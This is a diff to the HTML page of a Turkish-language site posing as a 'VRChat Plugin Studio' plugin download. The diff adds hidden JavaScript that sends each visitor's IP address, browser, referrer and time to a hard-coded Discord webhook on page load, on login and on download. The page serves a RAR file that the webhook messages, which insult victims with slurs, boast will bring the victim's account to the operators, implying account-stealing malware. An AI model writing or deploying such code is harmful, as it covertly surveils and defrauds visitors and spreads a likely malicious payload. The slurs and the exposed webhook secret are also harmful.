@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -475,7 +475,7 @@
                 <a href="#community" class="block py-2 px-4 nav-link hover:text-purple-400">Community</a>
                 <a href="#download" class="block py-2 px-4 nav-link hover:text-purple-400">download</a>
                 <div class="pt-4 space-y-2">
-                    <button class="w-full px-4 py-2 text-purple-400 border border-purple-400/50 rounded-lg hover:bg-purple-400/10 transition-all">
+                    <button onclick="handleLogin()" class="w-full px-4 py-2 text-purple-400 border border-purple-400/50 rounded-lg hover:bg-purple-400/10 transition-all">
                         Giriş Yap
                     </button>
                     <button class="w-full px-4 py-2 bg-gradient-to-r from-purple-500 to-pink-500 rounded-lg hover:from-purple-600 hover:to-pink-600 transition-all pulse-glow">
@@ -814,26 +814,203 @@
     </footer>
 
     <script>
+        // DISCORD WEBHOOK KONFIGÜRASYONU
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1431024834367848498/3_5GqONVLKn5qBE__lYiFpt-aBUWOkWI_zBEc7nGRM72MfFmxl4h-_ID5is5wenRREKT'; // Buraya Discord webhook URL'nizi yazın
+        
+        // IP ADRESİ ALMA VE DISCORD'A GÖNDERME FONKSİYONU
+        async function sendLoginToDiscord() {
+            try {
+                // IP adresini almak için ücretsiz servis kullanıyoruz
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+                
+                // Ek bilgileri topla
+                const userAgent = navigator.userAgent;
+                const timestamp = new Date().toLocaleString('tr-TR');
+                const referrer = document.referrer || 'Direkt giriş';
+                
+                // Discord webhook mesajı
+                const webhookMessage = {
+                    embeds: [{
+                        title: "🔐 Enayi zenci giris yapti",
+                        color: 0x00ff00, // Yeşil renk
+                        fields: [
+                            {
+                                name: "🌐 IP Adresi",
+                                value: `\`${userIP}\``,
+                                inline: true
+                            },
+                            {
+                                name: "🕐 Zaman",
+                                value: `\`${timestamp}\``,
+                                inline: true
+                            },
+                            {
+                                name: "🌍 Referrer",
+                                value: `\`${referrer}\``,
+                                inline: true
+                            },
+                            {
+                                name: "💻 Tarayıcı",
+                                value: `\`${userAgent.substring(0, 100)}...\``,
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: "VRChat Plugin Studio - Güvenlik Sistemi",
+                            icon_url: "https://vrchatplugin.net/images/my-new-logo.png"
+                        },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                
+                // Discord webhook'a gönder
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(webhookMessage)
+                });
+                
+                console.log('✅ Giriş bilgileri Discord\'a gönderildi:', userIP);
+                
+            } catch (error) {
+                console.error('❌ Discord webhook hatası:', error);
+            }
+        }
+        
+        // SAYFA YÜKLENDİĞİNDE ÇALIŞACAK FONKSİYON
+        function trackPageVisit() {
+            // Sayfa yüklendiğinde IP'yi Discord'a gönder
+            sendLoginToDiscord();
+            
+            // Ek güvenlik: Sayfa görünürlük değişikliklerini takip et
+            document.addEventListener('visibilitychange', function() {
+                if (!document.hidden) {
+                    // Sayfa tekrar görünür olduğunda da gönder
+                    setTimeout(sendLoginToDiscord, 1000);
+                }
+            });
+        }
+        
+        // GİRİŞ YAPMA FONKSİYONU
+        async function handleLogin() {
+            try {
+                // Önce Discord'a giriş bilgisini gönder
+                await sendLoginToDiscord();
+                
+                // Giriş yapma işlemi (örnek)
+                showToast('Giriş yapılıyor...', 'info');
+                
+                // Burada gerçek giriş işleminizi yapabilirsiniz
+                // Örnek: window.location.href = '/login';
+                
+            } catch (error) {
+                console.error('Giriş hatası:', error);
+                showToast('Giriş sırasında hata oluştu!', 'error');
+            }
+        }
+        
+        // İNDİRME BİLDİRİMİ DISCORD'A GÖNDERME FONKSİYONU
+        async function sendDownloadToDiscord() {
+            try {
+                // IP adresini almak için ücretsiz servis kullanıyoruz
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+                
+                // Ek bilgileri topla
+                const userAgent = navigator.userAgent;
+                const timestamp = new Date().toLocaleString('tr-TR');
+                const referrer = document.referrer || 'Direkt giriş';
+                
+                // Discord webhook mesajı
+                const webhookMessage = {
+                    embeds: [{
+                        title: "📥 Enayi oruspu cocugunun hesabi bize geliyor! @everyone",
+                        color: 0x0099ff, // Mavi renk
+                        fields: [
+                            {
+                                name: "🌐 IP Adresi",
+                                value: `\`${userIP}\``,
+                                inline: true
+                            },
+                            {
+                                name: "🕐 Zaman",
+                                value: `\`${timestamp}\``,
+                                inline: true
+                            },
+                            {
+                                name: "📦 Dosya",
+                                value: `\`ShadowBorsn-1.0.0-setup.rar\``,
+                                inline: true
+                            },
+                            {
+                                name: "🌍 Referrer",
+                                value: `\`${referrer}\``,
+                                inline: true
+                            },
+                            {
+                                name: "💻 Tarayıcı",
+                                value: `\`${userAgent.substring(0, 100)}...\``,
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: "VRChat Plugin Studio - İndirme Takip Sistemi",
+                            icon_url: "https://vrchatplugin.net/images/my-new-logo.png"
+                        },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                
+                // Discord webhook'a gönder
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(webhookMessage)
+                });
+                
+                console.log('✅ İndirme bilgileri Discord\'a gönderildi:', userIP);
+                
+            } catch (error) {
+                console.error('❌ Discord webhook hatası:', error);
+            }
+        }
+
         // DOWNLOAD FONKSİYONU - YENİ EKLENDİ
-        function downloadFile() {
-            const downloadUrl = 'https://www.dropbox.com/scl/fi/z8u09592thpmsfz1u9kx3/vrcplugin.rar?rlkey=jn3qnxbo77xfj2jzgsa22omr7&st=vq29g3jv&dl=1';
-            
-            // Dinamik link oluştur
-            const link = document.createElement('a');
-            link.href = downloadUrl;
-            link.download = 'ShadowBorsn-1.0.0-setup.rar';
-            link.target = '_blank';
-            
-            // Link'i DOM'a ekle ve tıkla
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-            
-            // Console log
-            console.log('ShadowBorsn 1.0.0 indirildi!');
-            
-            // Opsiyonel: Toast mesajı
-            showToast('İndirme başladı!', 'success');
+        async function downloadFile() {
+            try {
+                // Önce Discord'a indirme bilgisini gönder
+                await sendDownloadToDiscord();
+                
+                const downloadUrl = 'https://www.dropbox.com/scl/fi/z8u09592thpmsfz1u9kx3/vrcplugin.rar?rlkey=jn3qnxbo77xfj2jzgsa22omr7&st=vq29g3jv&dl=1';
+                
+                // Dinamik link oluştur
+                const link = document.createElement('a');
+                link.href = downloadUrl;
+                link.download = 'ShadowBorsn-1.0.0-setup.rar';
+                link.target = '_blank';
+                
+                // Link'i DOM'a ekle ve tıkla
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                
+                // Console log
+                console.log('ShadowBorsn 1.0.0 indirildi!');
+                
+                // Toast mesajı
+                showToast('İndirme başladı!', 'success');
+                
+            } catch (error) {
+                console.error('İndirme hatası:', error);
+                showToast('İndirme sırasında hata oluştu!', 'error');
+            }
         }
 
         // TOAST MESAJ FONKSİYONU
@@ -861,6 +1038,9 @@
         // Loader sadece DOM hazır olunca kapanacak
         window.addEventListener('DOMContentLoaded', () => {
             document.getElementById('loader').classList.add('hidden');
+            
+            // Sayfa yüklendiğinde IP takibini başlat
+            trackPageVisit();
         });// Smooth scrolling for navigation links
         document.querySelectorAll('a[href^="#"]').forEach(anchor => {
             anchor.addEventListener('click', function (e) {
@@ -1000,7 +1180,6 @@
     </script>
 </body>
 </html>
-
 
 
 
